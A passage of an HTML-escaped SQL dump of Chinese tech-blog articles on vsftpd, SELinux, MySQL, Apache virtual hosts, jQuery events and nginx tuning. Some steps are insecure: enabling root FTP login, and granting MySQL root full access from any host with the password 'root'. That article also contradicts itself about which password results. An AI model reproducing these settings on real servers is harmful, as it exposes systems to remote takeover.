that one of the listen options is commented !!&lt;br /&gt;#listen_ipv6=YES&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;pam_service_name=vsftpd&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;chroot_local_user=YES&lt;br /&gt;&lt;/span&gt;userlist_enable=YES&lt;br /&gt;tcp_wrappers=YES&lt;/p&gt;&lt;p&gt;注：此配置文件仅在默认配置文件基础上修改为如下两项：&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;anonymous_enable=NO &amp;nbsp; &amp;nbsp;#禁止匿名登录&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;chroot_local_user=YES &amp;nbsp; &amp;nbsp; #把系统内所有的FTP用户都限制在家目录中&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;7.查看谁登陆了FTP,并杀死它的进程&lt;/strong&gt;&lt;br /&gt;ps &ndash;xf |grep ftp&lt;br /&gt;kill 进程号 &lt;br /&gt;&lt;br /&gt;&lt;strong&gt;8.使vsftp下root登录：&lt;/strong&gt;&lt;br /&gt;1)编辑两个FTP配置文件：&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;/etc/vsftpd/ftpusers&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;/etc/vsftpd/user_list&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;将root那一行删掉或#注释掉； &lt;br /&gt;&lt;br /&gt;2)重启vsftpd服务：&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;service vsftpd restart&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386861068),
(91, 91, '&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;div&gt;问题由于selinux引起的，问题解决办法：&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;输入：getsebool -a | grep ftpd&lt;/div&gt;allow_ftpd_anon_write &ndash;&amp;gt; off&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;allow_ftpd_full_access-&amp;gt;off&lt;/span&gt;&lt;br /&gt;&lt;div&gt;allow_ftpd_use_cifs &ndash;&amp;gt; off&lt;/div&gt;&lt;div&gt;allow_ftpd_use_nfs &ndash;&amp;gt; off&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;ftp_home_dir-&amp;gt;off&lt;/span&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;ftpd_connect_db &ndash;&amp;gt; off&lt;/div&gt;&lt;div&gt;httpd_enable_ftp_server &ndash;&amp;gt; off&lt;/div&gt;&lt;div&gt;sftpd_anon_write &ndash;&amp;gt; off&lt;/div&gt;&lt;div&gt;sftpd_enable_homedirs &ndash;&amp;gt; off&lt;/div&gt;&lt;div&gt;sftpd_full_access &ndash;&amp;gt; off&lt;/div&gt;&lt;div&gt;sftpd_write_ssh_home &ndash;&amp;gt; off&lt;/div&gt;tftp_anon_write &ndash;&amp;gt; off&lt;br /&gt;&lt;br /&gt;将红色的配置项设置为on&lt;br /&gt;setsebool allow_ftpd_full_access on&lt;span style=&quot;font-size:14px&quot;&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px&quot;&gt;setsebool ftp_home_dir on&lt;/span&gt;&lt;/span&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386861156),
(92, 92, '&lt;p&gt;#mysql -uroot -p&lt;/p&gt;&lt;p&gt;输入密码进入mysql命令行模式&lt;/p&gt;&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;mysql&amp;gt; use mysql;\r\nDatabase changed\r\nmysql&amp;gt; grant all privileges on *.* to root@&#039;%&#039; identified by &quot;root&quot;;\r\nQuery OK, 0 rows affected (0.00 sec)\r\nmysql&amp;gt; update user set password=PASSWORD(123456) where host=&#039;%&#039;;\r\nQuery OK, 1 rows affected (0.00 sec)\r\nmysql&amp;gt; select host,user,password from user;\r\n+--------------+------+-------------------------------------------+\r\n| host         | user | password                                  |\r\n+--------------+------+-------------------------------------------+\r\n| localhost    | root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |\r\n| 192.168.1.1  | root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |\r\n| %            | root | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |\r\n+--------------+------+-------------------------------------------+\r\n3 rows in set (0.00 sec)\r\nmysql&amp;gt; flush privileges;\r\nQuery OK, 0 rows affected (0.00 sec)&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;这样机器就可以以用户名root密码root远程访问该机器上的MySql.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386861313),
(93, 93, '&lt;p&gt;公司最近做一个餐饮网站，需要根据访问者位置信息（经纬度坐标），搜索其附近餐厅&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;基本思路如下：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;1、将餐厅位置（经纬度）存入数据库&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;2、获取访问者位置信息（经纬度坐标）&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;3、查询数据库得到距离访问者1000米范围内的餐厅&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;具体解决方案如下：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color:#006600&quot;&gt;1、将餐厅位置（经纬度）存入数据库&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;Mysql支持一种空间数据类型Geometry，其可以存储几何空间数据&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;Geometry是一种基本类。它是一种抽象类。Geometry的可实例化子类限制为可在2维坐标空间中存在的0、1、2维几何对象。所有的可实例化几何类是这样定义的，从而使得几何类的实例从拓扑意义上讲是闭合的（也就是说，所有定义的几何类包含其边界）。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;基本Geometry类具有关于Point、Curve、Surface和GeometryCollection的子类：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&middot;Point表示0维对象。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&middot;Curve表示1维对象，具有子类LineString，以及次级子类Line和LinearRing。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&middot;Surface是为2维对象设计的，具有子类Polygon。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&middot;GeometryCollection具有特殊的0维、1维和2维类集合，名为MultiPoint、MultiLineString和MultiPolygon，分别用于为对应的Points、LineStrings和Polygons集合进行几何建模。MultiCurve和MultiSurface是作为抽象超类引入的，它们归纳了用于处理Curves和Surfaces的集合接口。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;Geometry、Curve、Surface、MultiCurve和MultiSurface定义为非实例化类。它们为其子类定义了公用方法集合，而且是为扩展而包含在内的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;Point、LineString、Polygon、GeometryCollection、MultiPoint、MultiLineString和MultiPolygon定义为可实例化类。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;存储的数据格式：&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;文本(WTK)格式&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#333333&quot;&gt;如：POINT(15 20)&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;二进制(WKB)格式&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#333333&quot;&gt;例如，与POINT(1 1)对应的WKB值由下述21字节序列构成（在此，每个字节由2个十六进制数值表示）：&lt;br /&gt;0101000000000000000000F03F000000000000F03F&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;首先我们创建一张shop表&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;mysql&amp;gt; CREATE TABLE `shop`( \r\n        `shopid` int(11) NOT NULL AUTO_INCREMENT, \r\n        `latlng` geometry DEFAULT NULL, \r\n        PRIMARY KEY (`shopid`) \r\n       ) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;&lt;/pre&gt;&lt;p&gt;然后将餐厅的维度和经度信息存入数据库，存成POINT类数据&lt;/p&gt;&lt;pre class=&quot;brush:sql;toolbar:false;&quot;&gt;mysql&amp;gt; insert into shop(latlng) values(GeomFromText(&#039;POINT(31.2689 120.275)&#039;));&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386861406),
(94, 94, '&lt;p&gt;我们有两个域名&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;A域名 www.a.com&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#006600&quot;&gt;B域名 www.b.com&lt;/span&gt;&lt;/p&gt;&lt;p&gt;现在需要A域名作为项目一的特定域名，而B域名作为项目二的特定域名&lt;/p&gt;&lt;p&gt;服务器为固定IP服务器，且http服务器为Apache，版本2.4&lt;/p&gt;&lt;p&gt;A域名和B域名均已添加A记录指向服务器IP&lt;br /&gt;&lt;/p&gt;&lt;p&gt;现将服务器同时绑定A域名和B域名，并且两个域名共同使用80端口&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;Apache配置过程如下：&lt;/p&gt;&lt;p&gt;1、编辑conf/httpd.conf&lt;/p&gt;&lt;p&gt;找到 LoadModule vhost_alias_module modules/mod_vhost_alias.so&lt;/p&gt;&lt;p&gt;去掉前面的#注释&lt;/p&gt;&lt;p&gt;找到 Include &amp;quot;conf/extra/httpd-vhosts.conf&amp;quot;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;去掉前面的#注释&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;2、编辑extra/httpd-vhosts.conf&lt;/p&gt;&lt;p&gt;在文件最后添加以下代码：&lt;/p&gt;&lt;p&gt;&amp;lt;VirtualHost *:80&amp;gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;DocumentRoot &amp;quot;C:/xampp/htdocs/project&amp;quot;&lt;br /&gt; &amp;nbsp; &amp;nbsp;ServerName a.com&lt;br /&gt; &amp;nbsp; &amp;nbsp;ServerAlias www.a.com&lt;br /&gt;&amp;lt;/VirtualHost&amp;gt;&lt;br /&gt;&lt;br /&gt;&amp;lt;VirtualHost *:80&amp;gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;DocumentRoot &amp;quot;C:/xampp/htdocs/myblog&amp;quot;&lt;br /&gt; &amp;nbsp; &amp;nbsp;ServerName b.com&lt;br /&gt; &amp;nbsp; &amp;nbsp;ServerAlias www.b.com&lt;br /&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;3、重启Apache服务器&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;如果域名的DNS服务器已经正常解析，则我们分别访问两个域名可以进入不同的系统&lt;/p&gt;&lt;p&gt;例如：&lt;/p&gt;&lt;p&gt;访问&lt;br /&gt;&lt;/p&gt;&lt;p&gt;http://www.a.com/ &amp;nbsp;会进入某个项目的系统&lt;/p&gt;&lt;p&gt;而访问&lt;/p&gt;&lt;p&gt;http://www.b.com/ 则会进入我的个人博客&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;如果要把A域名作为几个项目共用的域名，则只需要将项目文件夹(project1)放到A域名的文档根目录(DocumentRoot)里面&lt;/p&gt;&lt;p&gt;项目访问地址为http://www.a.com/project1&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386861506);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(96, 96, '&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;基本要素&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;DOM树&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;首先，可视化一个HMTL文档的DOM树是很有帮助的。一个简单的HTML页面看起来就像是这个样子：&lt;/p&gt;&lt;p style=&quot;text-align:center;text-indent:2em;&quot;&gt;&lt;img src=&quot;http://imbzd-imbzd.stor.sinaapp.com/1387185760_gteeu6_2526_1603571.png&quot; title=&quot;1603571.png&quot; /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;事件冒泡(又称事件传播)&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;当我们点击一个链接时，其触发了链接元素的单击事件，该事件则引发任何我们已绑定到该元素的单击事件上的函数的执行。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#000000;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&#039;a&#039;).bind(&#039;click&#039;, function() { alert(&quot;That tickles!&quot;) });&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#000000;&quot;&gt;&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;因此一个单击操作会触发alert函数的执行。&lt;/p&gt;&lt;p style=&quot;text-align:center;text-indent:2em;&quot;&gt;&lt;img src=&quot;http://imbzd-imbzd.stor.sinaapp.com/1387185761_m95o17_9117_1603572.png&quot; title=&quot;1603572.png&quot; /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;click事件接着会向树的根方向传播，广播到父元素，然后接着是每个祖先元素，只要是它的某个后代元素上的单击事件被触发，事件就会传给它。&lt;/p&gt;&lt;p style=&quot;text-align:center;text-indent:2em;&quot;&gt;&lt;img src=&quot;http://imbzd-imbzd.stor.sinaapp.com/1387185762_i6osv4_2954_1603573.png&quot; title=&quot;1603573.png&quot; /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;在操纵DOM的语境中，document是根节点。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;现在我们可以较容易地说明.bind()、.live()和.delegate()的不同之处了。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;.bind()&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&#039;a&#039;).bind(&#039;click&#039;, function() { alert(&quot;That tickles!&quot;) });&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;这是最简单的绑定方法了。JQuery扫描文档找出所有的$(&lsquo;a&rsquo;)元素，并把alert函数绑定到每个元素的click事件上。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;.live()&lt;/strong&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&#039;a&#039;).live(&#039;click&#039;, function() { alert(&quot;That tickles!&quot;) });&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;JQuery把alert函数绑定到$(document)元素上，并使用&rsquo;click&rsquo;和&rsquo;a&rsquo;作为参数。任何时候只要有事件冒泡到document节点上，它就查看该事件是否是一个click事件，以及该事件的目标元素与&rsquo;a&rsquo;这一CSS选择器是否匹配，如果都是的话，则执行函数。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;live方法还可以被绑定到具体的元素(或context)而不是document上，像这样：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#000000;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&#039;a&#039;, $(&#039;#container&#039;)[0]).live(...);&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;.delegate()&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#000000;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&#039;#container&#039;).delegate(&#039;a&#039;, &#039;click&#039;, function() { alert(&quot;That tickles!&quot;) });&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#000000;&quot;&gt;&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;JQuery扫描文档查找$(&lsquo;#container&rsquo;)，并使用click事件和&rsquo;a&rsquo;这一CSS选择器作为参数把alert函数绑定到$(&lsquo;#container&rsquo;)上。任何时候只要有事件冒泡到$(&lsquo;#container&rsquo;)上，它就查看该事件是否是click事件，以及该事件的目标元素是否与CCS选择器相匹配。如果两种检查的结果都为真的话，它就执行函数。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;　　可以注意到，这一过程与.live()类似，但是其把处理程序绑定到具体的元素而非document这一根上。精明的JS&rsquo;er们可能会做出这样的结论，即$(&amp;#39;a&amp;#39;).live() == $(document).delegate(&amp;#39;a&amp;#39;)，是这样吗?嗯，不，不完全是。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;为什么.delegate()要比.live()好用&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;基于几个原因，人们通常更愿意选用jQuery的delegate方法而不是live方法。考虑下面的例子：&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&#039;a&#039;).live(&#039;click&#039;, function() { blah() });\r\n// 或者\r\n$(document).delegate(&#039;a&#039;, &#039;click&#039;, function() { blah() });&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;速度&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;后者实际上要快过前者，因为前者首先要扫描整个的文档查找所有的$(&lsquo;a&rsquo;)元素，把它们存成jQuery对象。尽管live函数仅需要把&rsquo;a&rsquo;作为串参数传递以用做之后的判断，但是$()函数并未知道被链接的方法将会是.live()。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;而另一方面，delegate方法仅需要查找并存储$(document)元素。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;一种寻求避开这一问题的方法是调用在$(document).ready()之外绑定的live，这样它就会立即执行。在这种方式下，其会在DOM获得填充之前运行，因此就不会查找元素或是创建jQuery对象了。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;灵活性和链能力&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;live函数也挺令人费解的。想想看，它被链到$(&lsquo;a&rsquo;)对象集上，但其实际上是在$(document)对象上发生作用。由于这个原因，它能够试图以一种吓死人的方式来把方法链到自身上。实际上，我想说的是，以$.live(&lsquo;a&rsquo;,&hellip;)这一形式作为一种全局性的jQuery方法，live方法会更具意义一些。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;仅支持CSS选择器&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;最后一点，live方法有一个非常大的缺点，那就是它仅能针对直接的CSS选择器做操作，这使得它变得非常的不灵活。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;欲了解更多关于CSS选择器的缺点，请参阅Exploring jQuery .live() and .die()一文。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;更新：感谢Hacker News上的pedalpete和后面评论中的Ellsass提醒我加入接下来的这一节内容。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;为什么选择.live()或.delegate()而不是.bind()&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;毕竟，bind看起来似乎更加的明确和直接，难道不是吗?嗯，有两个原因让我们更愿意选择delegate或live而不是bind：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;为了把处理程序附加到可能还未存在于DOM中的DOM元素之上。因为bind是直接把处理程序绑定到各个元素上，它不能把处理程序绑定到还未存在于页面中的元素之上。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;如果你运行了$(&lsquo;a&rsquo;).bind(&hellip;)，而后新的链接经由AJAX加入到了页面中，则你的bind处理程序对于这些新加入的链接来说是无效的。而另一方面live和delegate则是被绑定到另一个祖先节点上，因此其对于任何目前或是将来存在于该祖先元素之内的元素都是有效的。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;或者为了把处理程序附加到单个元素上或是一小组元素之上，监听后代元素上的事件而不是循环遍历并把同一个函数逐个附加到DOM中的100个元素上。把处理程序附加到一个(或是一小组)祖先元素上而不是直接把处理程序附加到页面中的所有元素上，这种做法带来了性能上的好处。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;停止传播&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;最后一个我想做的提醒与事件传播有关。通常情况下，我们可以通过使用这样的事件方法来终止处理函数的执行：&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;$(&#039;a&#039;).bind(&#039;click&#039;, function(e) {\r\ne.preventDefault();\r\n// 或者\r\ne.stopPropagation();\r\n});&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;不过，当我们使用live或是delegate方法的时候，处理函数实际上并没有在运行，需要等到事件冒泡到处理程序实际绑定的元素上时函数才会运行。而到此时为止，我们的其他的来自.bind()的处理函数早已运行了。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考链接：&lt;a target=&quot;_blank&quot; href=&quot;http://kb.cnblogs.com/page/94469/&quot;&gt;http://kb.cnblogs.com/page/94469/&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;', 1387186310),
(97, 97, '&lt;p&gt;大多数的Nginx安装指南告诉你如下基础知识&mdash;&mdash;通过apt-get安装，修改这里或那里的几行配置，好了，你已经有了一个Web服务器了！而且，在大多数情况下，一个常规安装的nginx对你的网站来说已经能很好地工作了。然而，如果你真的想挤压出nginx的性能，你必须更深入一些。在本指南中，我将解释Nginx的那些设置可以微调，以优化处理大量客户端时的性能。需要注意一点，这不是一个全面的微调指南。这是一个简单的预览&mdash;&mdash;那些可以通过微调来提高性能设置的概述。你的情况可能不同。&lt;br /&gt;&lt;span id=&quot;more-2061&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 id=&quot;content_h2_1_6&quot;&gt;基本的 (优化过的)配置&lt;/h2&gt;&lt;p&gt;我们将修改的唯一文件是&lt;strong&gt;nginx.conf&lt;/strong&gt;，其中包含Nginx不同模块的所有设置。你应该能够在服务器的&lt;strong&gt;/etc/nginx&lt;/strong&gt;目录中找到nginx.conf。首先，我们将谈论一些全局设置，然后按文件中的模块挨个来，谈一下哪些设置能够让你在大量客户端访问时拥有良好的性能，为什么它们会提高性能。本文的结尾有一个完整的配置文件。&lt;/p&gt;&lt;h2 id=&quot;content_h2_2_5&quot;&gt;高层的配置&lt;/h2&gt;&lt;p&gt;nginx.conf文件中，Nginx中有少数的几个高级配置在模块部分之上。&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;user www-data;\r\npid /var/run/nginx.pid;\r\n                                                      \r\nworker_processes auto;\r\n                                                      \r\nworker_rlimit_nofile 100000;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;worker_processes &lt;/strong&gt;定义了nginx对外提供web服务时的worder进程数。最优值取决于许多因素，包括（但不限于）CPU核的数量、存储数据的硬盘数量及负载模式。不能确定的时候，将其设置为可用的CPU内核数将是一个好的开始（设置为&ldquo;auto&rdquo;将尝试自动检测它）。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;worker_rlimit_nofile &lt;/strong&gt;更改worker进程的最大打开文件数限制。如果没设置的话，这个值为操作系统的限制。设置后你的操作系统和Nginx可以处理比&ldquo;ulimit -a&rdquo;更多的文件，所以把这个值设高，这样nginx就不会有&ldquo;too many open files&rdquo;问题了。&lt;/p&gt;&lt;h2 id=&quot;content_h2_3_5&quot;&gt;Events模块&lt;/h2&gt;&lt;p&gt;events模块中包含nginx中所有处理连接的设置。&lt;/p&gt;&lt;pre class=&quot;brush:ps;toolbar:false;&quot;&gt;events {\r\nworker_connections 2048;\r\nmulti_accept on;\r\nuse epoll;\r\n}&lt;/pre&gt;&lt;p&gt;user和pid应该按默认设置 &ndash; 我们不会更改这些内容，因为更改与否没有什么不同。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;worker_connections&lt;/strong&gt;设置可由一个worker进程同时打开的最大连接数。如果设置了上面提到的worker_rlimit_nofile，我们可以将这个值设得很高。&lt;/p&gt;&lt;p&gt;记住，最大客户数也由系统的可用socket连接数限制（~ 64K），所以设置不切实际的高没什么好处。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;multi_accept &lt;/strong&gt;告诉nginx收到一个新连接通知后接受尽可能多的连接。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;use&lt;/strong&gt; 设置用于复用客户端线程的轮询方法。如果你使用Linux 2.6+，你应该使用epoll。如果你使用*BSD，你应该使用kqueue。想知道更多有关事件轮询？看下维基百科吧（注意，想了解一切的话可能需要neckbeard和操作系统的课程基础）&lt;/p&gt;&lt;p&gt;（值得注意的是如果你不知道Nginx该使用哪种轮询方法的话，它会选择一个最适合你操作系统的）&lt;/p&gt;&lt;h2 id=&quot;content_h2_4_5&quot;&gt;HTTP 模块&lt;/h2&gt;&lt;p&gt;HTTP模块控制着nginx http处理的所有核心特性。因为这里只有很少的配置，所以我们只节选配置的一小部分。所有这些设置都应该在http模块中，甚至你不会特别的注意到这段设置。&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;http {\r\n                               \r\nserver_tokens off;\r\n                               \r\nsendfile on;\r\n                               \r\ntcp_nopush on;\r\ntcp_nodelay on;\r\n                               \r\n...\r\n}&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;sendfile&lt;/strong&gt;可以让sendfile()发挥作用。sendfile()可以在磁盘和TCP socket之间互相拷贝数据(或任意两个文件描述符)。Pre-sendfile是传送数据之前在用户空间申请数据缓冲区。之后用read()将数据从文件拷贝到这个缓冲区，write()将缓冲区数据写入网络。sendfile()是立即将数据从磁盘读到OS缓存。因为这种拷贝是在内核完成的，sendfile()要比组合read()和write()以及打开关闭丢弃缓冲更加有效(更多有关于sendfile)&lt;/p&gt;&lt;p&gt;&lt;strong&gt;tcp_nopush&lt;/strong&gt; 告诉nginx在一个数据包里发送所有头文件，而不一个接一个的发送&lt;/p&gt;&lt;p&gt;&lt;strong&gt;tcp_nodelay&lt;/strong&gt; 告诉nginx不要缓存数据，而是一段一段的发送&ndash;当需要及时发送数据时，就应该给应用设置这个属性，这样发送一小块数据信息时就不能立即得到返回值。&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;access_log off;\r\nerror_log /var/log/nginx/error.log crit;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;access_log&lt;/strong&gt;设置nginx是否将存储访问日志。关闭这个选项可以让读取磁盘IO操作更快(aka,YOLO)&lt;/p&gt;&lt;p&gt;&lt;strong&gt;error_log &lt;/strong&gt;告诉nginx只能记录严重的错误&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;keepalive_timeout 10;\r\n               \r\nclient_header_timeout 10;\r\nclient_body_timeout 10;\r\n               \r\nreset_timedout_connection on;\r\nsend_timeout 10;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;strong&gt;keepalive_timeout&lt;/strong&gt; 